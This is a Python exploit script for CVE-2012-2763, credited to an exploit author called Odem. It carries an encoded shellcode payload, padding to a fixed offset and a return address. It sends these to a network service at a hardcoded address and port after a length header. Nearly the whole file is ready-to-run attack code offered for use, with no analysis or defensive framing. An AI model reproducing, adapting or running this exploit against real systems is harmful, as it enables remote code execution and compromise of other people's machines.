#!/usr/bin/python

#------------------------------------------------------------------------------------#
#	Exploit Author     :	Odem
#	Originally found by:	Joseph Sheridan, Reaction Information Security Limited
#	CVE                :	2012-2763
#	Date               :	02.06.12
#------------------------------------------------------------------------------------#

import socket
import sys

offset=3754
shellcode=(
"\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a\x4a"
"\x4a\x4a\x37\x52\x59\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
"\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50"
"\x38\x41\x42\x75\x4a\x49\x49\x6c\x38\x68\x6b\x39\x63\x30\x53"
"\x30\x57\x70\x63\x50\x6b\x39\x78\x65\x74\x71\x58\x52\x30\x64"
"\x4e\x6b\x71\x42\x76\x50\x4e\x6b\x53\x62\x66\x6c\x4c\x4b\x76"
"\x32\x57\x64\x6c\x4b\x73\x42\x45\x78\x36\x6f\x58\x37\x71\x5a"
"\x76\x46\x74\x71\x6b\x4f\x44\x71\x49\x50\x4c\x6c\x75\x6c\x50"
"\x61\x61\x6c\x64\x42\x74\x6c\x71\x30\x79\x51\x48\x4f\x76\x6d"
"\x63\x31\x4a\x67\x59\x72\x38\x70\x76\x32\x66\x37\x6e\x6b\x30"
"\x52\x74\x50\x4c\x4b\x50\x42\x57\x4c\x57\x71\x6e\x30\x6c\x4b"
"\x71\x50\x51\x68\x4e\x65\x4f\x30\x74\x34\x63\x7a\x43\x31\x58"
"\x50\x70\x50\x4e\x6b\x77\x38\x34\x58\x6c\x4b\x71\x48\x55\x70"
"\x46\x61\x6b\x63\x48\x63\x35\x6c\x42\x69\x4e\x6b\x36\x54\x6e"
"\x6b\x73\x31\x79\x46\x65\x61\x69\x6f\x56\x51\x4f\x30\x6c\x6c"
"\x6b\x71\x5a\x6f\x64\x4d\x37\x71\x79\x57\x35\x68\x69\x70\x43"
"\x45\x4a\x54\x75\x53\x51\x6d\x4b\x48\x45\x6b\x31\x6d\x55\x74"
"\x42\x55\x58\x62\x46\x38\x6e\x6b\x70\x58\x37\x54\x45\x51\x6b"
"\x63\x31\x76\x6c\x4b\x44\x4c\x32\x6b\x4e\x6b\x61\x48\x67\x6c"
"\x77\x71\x48\x53\x4c\x4b\x44\x44\x6e\x6b\x76\x61\x6a\x70\x6b"
"\x39\x77\x34\x46\x44\x71\x34\x53\x6b\x43\x6b\x75\x31\x33\x69"
"\x32\x7a\x33\x61\x4b\x4f\x79\x70\x33\x68\x51\x4f\x50\x5a\x4e"
"\x6b\x34\x52\x6a\x4b\x6c\x46\x71\x4d\x30\x68\x76\x53\x56\x52"
"\x53\x30\x43\x30\x72\x48\x42\x57\x51\x63\x45\x62\x73\x6f\x33"
"\x64\x61\x78\x72\x6c\x33\x47\x66\x46\x35\x57\x49\x6f\x78\x55"
"\x58\x38\x6a\x30\x46\x61\x57\x70\x77\x70\x75\x79\x68\x44\x61"
"\x44\x36\x30\x62\x48\x37\x59\x4d\x50\x30\x6b\x57\x70\x69\x6f"
"\x4b\x65\x72\x70\x50\x50\x36\x30\x72\x70\x73\x70\x70\x50\x47"
"\x30\x46\x30\x70\x68\x4b\x5a\x56\x6f\x69\x4f\x59\x70\x4b\x4f"
"\x4b\x65\x6d\x47\x70\x6a\x44\x45\x33\x58\x69\x50\x49\x38\x67"
"\x71\x57\x7a\x65\x38\x65\x52\x75\x50\x34\x51\x33\x6c\x6e\x69"
"\x39\x76\x70\x6a\x42\x30\x56\x36\x53\x67\x50\x68\x4d\x49\x4c"
"\x65\x74\x34\x75\x31\x4b\x4f\x59\x45\x4d\x55\x79\x50\x50\x74"
"\x66\x6c\x4b\x4f\x62\x6e\x34\x48\x34\x35\x58\x6c\x55\x38\x48"
"\x70\x38\x35\x39\x32\x51\x46\x79\x6f\x6b\x65\x30\x6a\x63\x30"
"\x52\x4a\x73\x34\x42\x76\x66\x37\x52\x48\x77\x72\x68\x59\x58"
"\x48\x31\x4f\x59\x6f\x5a\x75\x6c\x4b\x34\x76\x61\x7a\x43\x70"
"\x75\x38\x45\x50\x36\x70\x45\x50\x37\x70\x73\x66\x32\x4a\x67"
"\x70\x30\x68\x33\x68\x39\x34\x30\x53\x6d\x35\x49\x6f\x6a\x75"
"\x4d\x43\x30\x53\x33\x5a\x53\x30\x50\x56\x31\x43\x56\x37\x53"
"\x58\x57\x72\x6e\x39\x6b\x78\x63\x6f\x6b\x4f\x79\x45\x75\x51"
"\x79\x53\x54\x69\x6b\x76\x6d\x55\x58\x76\x34\x35\x68\x6c\x7a"
"\x63\x41\x41"
)

padsize= offset - len(shellcode)
padding ="\x43"*padsize
ret = "\x72\x44\x61\x68"
evil= shellcode + padding + ret

size=len(evil)
hb=size/256
lb=size%256

header=[]
header.append(0x47)
header.append(hb)
header.append(lb)

print "Dropsize: %d\n" % len(evil)
print "Header: 0x%x 0x%x 0x%x\n" % (header[0], header[1], header[2])

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('192.168.1.80',10008))

s.send( bytearray(header) )
s.send(evil)
print "Done!\n"

